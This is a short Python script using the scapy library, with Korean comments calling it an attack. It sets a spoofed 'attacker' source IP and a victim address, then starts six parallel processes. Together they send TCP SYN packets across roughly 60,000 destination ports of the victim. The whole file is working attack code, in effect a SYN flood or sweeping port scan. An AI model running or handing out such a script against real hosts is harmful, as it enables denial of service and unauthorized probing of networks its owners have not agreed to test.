from multiprocessing import Process
from scapy.all import *
import random

# 대상 IP 주소와 포트
Attacker_ip = "111.111.111.111" #Attacker Ip adress
target_ip = "192.168.0.74" #victim Ip adress
target_port = 2000 #victim port

#물리계층별 패킷
l3 = IP(src = Attacker_ip,dst=target_ip)
l4 = TCP(dport=target_port, flags = "S")

# 공격 대상 패킷
#target_packet = l3/l4

# 패킷을 보내는 함수
def send_packets(adds):
    for i in range(10000):
        temp_l4 = TCP(dport=i+adds, flags = "S")
        target_packet = l3/temp_l4
        send(target_packet, verbose=False)
        target_packet.show()

# 공격 실행



if __name__ == '__main__':
    th1 = Process(target=send_packets, args=(0,))
    th2 = Process(target=send_packets, args=(10000,))
    th3 = Process(target=send_packets, args=(20000,))
    th4 = Process(target=send_packets, args=(30000,))
    th5 = Process(target=send_packets, args=(40000,))
    th6 = Process(target=send_packets, args=(50000,))

    th1.start()
    th2.start()
    th3.start()
    th4.start()
    th5.start()
    th6.start()
